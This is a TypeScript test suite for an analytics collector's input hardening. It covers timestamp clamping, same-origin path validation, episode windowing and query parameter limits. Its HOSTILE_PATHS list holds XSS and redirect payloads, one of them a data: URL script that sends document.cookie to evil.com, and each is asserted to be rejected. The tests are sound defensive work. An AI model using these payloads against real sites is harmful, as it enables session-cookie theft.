// Hardening of the collector's two client-controlled columns (started_at and
// path) plus the read-side bounds that the viewer trusts.
import assert from "node:assert/strict";
import { test } from "node:test";
import {
  EPISODE_WINDOW_MS,
  apiJourney,
  apiReplay,
  apiSessions,
  collect,
  purge,
} from "../src/api.ts";
import { D1_MAX_PARAMS, apiUrl, beacon, ev, makeEnv, pageview } from "./helpers/fake-d1.ts";
import type { TestEnv } from "./helpers/fake-d1.ts";

const DAY = 86_400_000;
const T = 1_700_000_000_000;
const YEAR = 365 * DAY;

interface PvRow {
  id: string;
  session_id: string;
  path: string;
  started_at: number;
  duration_ms: number;
}

const pvRow = (env: TestEnv, id = "pv-1") =>
  env.DB.rows<PvRow>(`SELECT * FROM pageviews WHERE id = ?`, id)[0];

const ids = (env: TestEnv) =>
  env.DB.rows<{ id: string }>(`SELECT id FROM pageviews ORDER BY id`).map((r) => r.id);

const insertPv = (env: TestEnv, id: string, sa: number, d = 0, sid = "sid-a", path = "/") =>
  env.DB.prepare(
    `INSERT INTO pageviews (id, session_id, site, path, vw, vh, started_at, duration_ms, max_scroll)
     VALUES (?1, ?2, 'testsite', ?3, 1440, 900, ?4, ?5, 0)`,
  )
    .bind(id, sid, path, sa, d)
    .run();

const journey = async (env: TestEnv, params: Record<string, string>) => {
  const res = await apiJourney(apiUrl("journey", { site: "testsite", ...params }), env as never);
  assert.equal(res.status, 200);
  return ((await res.json()) as { pageviews: { id: string; path: string; started_at: number }[] })
    .pageviews;
};

// ---------- started_at is server-authoritative ----------

test("a far-future started_at is not trusted, so retention still reaches the row", async () => {
  const env = makeEnv();
  const res = await collect(
    beacon(pageview({ pv: "pv-1", sa: T + 10 * YEAR, ev: [ev("c", 10)] })),
    env as never,
    T,
  );
  assert.equal(res.status, 204);
  // clamped to the receive time: a client cannot park a row beyond every cutoff
  assert.equal(pvRow(env).started_at, T);

  await purge(env, T + 91 * DAY);
  assert.deepEqual(ids(env), []);
  assert.equal(env.DB.count("events"), 0);
  env.DB.close();
});

test("sa = 0 is not stored as ancient, so a beacon does not vanish on arrival", async () => {
  const env = makeEnv();
  await collect(beacon(pageview({ pv: "pv-1", sa: 0, ev: [ev("c", 10)] })), env as never, T);
  assert.equal(pvRow(env).started_at, T);

  await purge(env, T);
  assert.deepEqual(ids(env), ["pv-1"]);
  assert.equal(env.DB.count("events"), 1);
  env.DB.close();
});

test("started_at: plausible client values are kept, implausible ones fall back to now", async () => {
  const cases: [unknown, number][] = [
    [T, T],
    [T - 5000, T - 5000],
    [T - 30 * DAY, T - 30 * DAY],
    [T + 1, T], // one ms ahead is still the future
    [T + 60_000, T],
    [T - 11 * YEAR, T], // older than the plausibility floor
    [-1, T],
    ["abc", T],
    [undefined, T],
    [Number.MAX_SAFE_INTEGER, T],
  ];
  for (const [sa, want] of cases) {
    const env = makeEnv();
    await collect(beacon(pageview({ sa })), env as never, T);
    assert.equal(pvRow(env).started_at, want, `sa=${String(sa)}`);
    env.DB.close();
  }
});

test("started_at is set on insert only, so a later beacon cannot rewind it", async () => {
  const env = makeEnv();
  await collect(beacon(pageview({ pv: "pv-1", sa: T - 10_000 })), env as never, T);
  await collect(beacon(pageview({ pv: "pv-1", sa: T - 5 * YEAR })), env as never, T);
  assert.equal(pvRow(env).started_at, T - 10_000);
  env.DB.close();
});

// ---------- path must be a same-origin absolute path ----------

// raw control characters, spelled by code point so this file stays text
const CTRL_PATHS = [0x00, 0x0b, 0x0c, 0x1f, 0x7f].map((c) => `/x${String.fromCharCode(c)}y`);

// Every one of these would be handed to the viewer's full-viewport same-origin
// iframe; the first three execute in the owner's origin.
const HOSTILE_PATHS: unknown[] = [
  "javascript:alert(document.cookie)",
  "JavaScript:alert(1)",
  "data:text/html,<script>fetch('//evil.com/'+document.cookie)</script>",
  "//evil.com/x",
  "///evil.com/x",
  "http://evil.com/x",
  "https://evil.com/x",
  "vbscript:msgbox(1)",
  "\\\\evil.com\\x",
  "/\\evil.com/x",
  "/x\\y",
  "",
  "x/y",
  " /x",
  "\t/x",
  "/x y",
  "/x\ny",
  "/x\rjavascript:alert(1)",
  "/\tjavascript:alert(1)",
  ...CTRL_PATHS,
];

test("hostile paths are refused with 400 and write nothing at all", async () => {
  for (const path of HOSTILE_PATHS) {
    const env = makeEnv();
    const res = await collect(
      beacon(pageview({ path, ev: [ev("c", 10)] })),
      env as never,
      T,
    );
    assert.equal(res.status, 400, JSON.stringify(path));
    assert.deepEqual(await res.json(), { error: "bad path" }, JSON.stringify(path));
    assert.equal(env.DB.count("pageviews"), 0, JSON.stringify(path));
    assert.equal(env.DB.count("events"), 0, JSON.stringify(path));
    env.DB.close();
  }
});

test("no hostile path can come back out of apiJourney or apiReplay", async () => {
  const env = makeEnv();
  await collect(beacon(pageview({ pv: "pv-ok", path: "/pricing" })), env as never, T);
  for (const path of HOSTILE_PATHS) {
    const res = await collect(
      beacon(pageview({ pv: "pv-evil", path, ev: [ev("c", 10)] })),
      env as never,
      T,
    );
    assert.equal(res.status, 400);
  }
  assert.deepEqual(ids(env), ["pv-ok"]);

  const sid = pvRow(env, "pv-ok").session_id;
  const seen = await journey(env, { sid, pv: "pv-ok" });
  assert.deepEqual(
    seen.map((p) => p.path),
    ["/pricing"],
  );

  const replay = await apiReplay(apiUrl("replay", { pv: "pv-evil" }), env as never);
  assert.equal(replay.status, 404);

  const dump = JSON.stringify([
    seen,
    await (await apiReplay(apiUrl("replay", { pv: "pv-ok" }), env as never)).json(),
    env.DB.rows(`SELECT * FROM pageviews`),
  ]);
  for (const needle of ["javascript", "vbscript", "data:text/html", "evil.com", "\\"]) {
    assert.equal(dump.toLowerCase().includes(needle.toLowerCase()), false, needle);
  }
  env.DB.close();
});

test("an ordinary pathname round-trips through collect, apiJourney and apiReplay", async () => {
  const ok = ["/", "/pricing", "/docs/getting-started", "/a-b_c.d~e/(f)/v1:2", "/x%20y", "/café"];
  for (const path of ok) {
    const env = makeEnv();
    const res = await collect(
      beacon(pageview({ pv: "pv-1", path, ev: [ev("c", 10)] })),
      env as never,
      T,
    );
    assert.equal(res.status, 204, path);
    assert.equal(pvRow(env).path, path);

    const seen = await journey(env, { sid: pvRow(env).session_id, pv: "pv-1" });
    assert.deepEqual(
      seen.map((p) => p.path),
      [path],
    );
    const meta = (await (
      await apiReplay(apiUrl("replay", { pv: "pv-1" }), env as never)
    ).json()) as { meta: { path: string } };
    assert.equal(meta.meta.path, path);
    env.DB.close();
  }
});

// ---------- duration_ms is monotonic ----------

test("a late small-duration re-flush cannot split an episode in two", async () => {
  const env = makeEnv();
  const now = T + 700_000;
  // pv-a is read for 10 minutes, pv-b starts 1s after it ends: one journey
  await collect(beacon(pageview({ pv: "pv-a", sa: T, d: 600_000 })), env as never, now);
  await collect(
    beacon(pageview({ pv: "pv-b", path: "/pricing", sa: T + 601_000, d: 1000 })),
    env as never,
    now,
  );
  // the first flush of pv-a (d=1000) arrives late, after the 600_000 one
  await collect(beacon(pageview({ pv: "pv-a", sa: T, d: 1000 })), env as never, now);
  assert.equal(pvRow(env, "pv-a").duration_ms, 600_000);

  const seen = await journey(env, { sid: pvRow(env, "pv-a").session_id, pv: "pv-b" });
  assert.deepEqual(
    seen.map((p) => p.id),
    ["pv-a", "pv-b"],
  );
  env.DB.close();
});

// ---------- apiJourney bounds the response around the requested pageview ----------

test("apiJourney: a 60-pageview episode keeps the requested pv inside the window", async () => {
  const env = makeEnv();
  for (let i = 0; i < 60; i++) await insertPv(env, `pv-${i}`, T + i * 1000, 0, "sid-a", `/p${i}`);

  for (const want of ["pv-0", "pv-2", "pv-30", "pv-55", "pv-59"]) {
    const seen = await journey(env, { sid: "sid-a", pv: want });
    assert.equal(seen.length, 50, want);
    assert.ok(
      seen.some((p) => p.id === want),
      `${want} must be in its own journey window`,
    );
    const starts = seen.map((p) => p.started_at);
    assert.deepEqual(starts, [...starts].sort((a, b) => a - b), want);
    assert.deepEqual(
      seen.map((p) => p.path),
      seen.map((p) => `/p${p.id.slice(3)}`),
      want,
    );
  }

  // without ?pv the window still starts at the beginning of the session
  const all = await journey(env, { sid: "sid-a" });
  assert.equal(all.length, 50);
  assert.equal(all[0].id, "pv-0");
  env.DB.close();
});

test("apiJourney: an episode at or under the cap is returned whole", async () => {
  const env = makeEnv();
  for (let i = 0; i < 50; i++) await insertPv(env, `pv-${i}`, T + i * 1000);
  const seen = await journey(env, { sid: "sid-a", pv: "pv-49" });
  assert.equal(seen.length, 50);
  assert.equal(seen[0].id, "pv-0");
  assert.equal(seen[49].id, "pv-49");
  env.DB.close();
});

// A session id is permanent, so the row cap is reachable by an ordinary
// returning visitor — and taking it from the start of the session would return
// only the oldest 200 pageviews, i.e. never the one being replayed.
test("apiJourney: a session past the 200-row cap still contains the requested pv", async () => {
  const env = makeEnv();
  // 400 pageviews, each 10 minutes apart => 400 separate one-page episodes
  for (let i = 0; i < 400; i++) {
    await insertPv(env, `pv-${i}`, T + i * 600_000, 1000, "sid-a", `/p${i}`);
  }
  for (const want of ["pv-0", "pv-1", "pv-199", "pv-200", "pv-250", "pv-399"]) {
    const seen = await journey(env, { sid: "sid-a", pv: want });
    assert.deepEqual(
      seen.map((p) => p.id),
      [want],
      want,
    );
  }
  env.DB.close();
});

test("apiJourney: an episode past the cap is windowed around the requested pv", async () => {
  const env = makeEnv();
  // one 300-leg episode: every leg chains to the next (1s gap), so the episode
  // itself is larger than both the SQL cap and the response window
  for (let i = 0; i < 300; i++) {
    await insertPv(env, `pv-${i}`, T + i * 2000, 1000, "sid-a", `/p${i}`);
  }
  for (const want of ["pv-150", "pv-299"]) {
    const seen = await journey(env, { sid: "sid-a", pv: want });
    assert.equal(seen.length, 50, want);
    assert.ok(
      seen.some((p) => p.id === want),
      `${want} must be in its own journey window`,
    );
    const starts = seen.map((p) => p.started_at);
    assert.deepEqual(starts, [...starts].sort((a, b) => a - b), want);
  }
  // Without ?pv there is no anchor, so the cap keeps the most recent 200
  // pageviews: the oldest end is what gets dropped, never the newest.
  const all = await journey(env, { sid: "sid-a" });
  assert.equal(all.length, 50);
  assert.equal(all[0].id, "pv-100");
  assert.equal(all[49].id, "pv-149");
  env.DB.close();
});

// ---------- read-side param ceiling ----------

test("apiSessions stays under D1's 100-param ceiling at its LIMIT", async () => {
  const base = makeEnv();
  // 35 rows, each its own session id: the row LIMIT (30) is what bounds the
  // follow-up IN (...) query, so raising it past ~99 would break D1 outright.
  for (let i = 0; i < 35; i++) await insertPv(base, `pv-${i}`, T + i * 1000, 0, `sid-${i}`);

  const binds: { sql: string; params: unknown[] }[] = [];
  const env = {
    ...base,
    DB: {
      prepare: (sql: string) => {
        const st = base.DB.prepare(sql);
        return {
          bind: (...v: unknown[]) => {
            binds.push({ sql, params: v });
            return st.bind(...v);
          },
        };
      },
    },
  };

  const res = await apiSessions(apiUrl("sessions", { site: "testsite", path: "/" }), env as never);
  assert.equal(res.status, 200);
  const rows = ((await res.json()) as { sessions: { started_at: number }[] }).sessions;
  assert.equal(rows.length, 30);

  const episodeQuery = binds.filter((b) => b.sql.includes("session_id IN ("));
  assert.equal(episodeQuery.length, 1);
  assert.equal(episodeQuery[0].params.length, 33, "site + window bounds + 30 session ids");
  for (const b of binds) {
    assert.ok(b.params.length <= D1_MAX_PARAMS, `${b.params.length}: ${b.sql.slice(0, 40)}`);
  }

  // A session id never rotates, so that IN (...) lookup must not mean "every
  // pageview these 30 visitors ever made": it is bounded to a window that still
  // brackets every listed row, plus room for their episodes either side.
  const [, lo, hi] = episodeQuery[0].params as [string, number, number];
  const starts = rows.map((r) => r.started_at);
  assert.ok(lo < Math.min(...starts), `${lo} must precede the oldest listed row`);
  assert.ok(hi > Math.max(...starts), `${hi} must follow the newest listed row`);
  assert.ok(hi - lo < 2 * EPISODE_WINDOW_MS + 35_000, `window ${hi - lo}ms is not bounded`);
  base.DB.close();
});
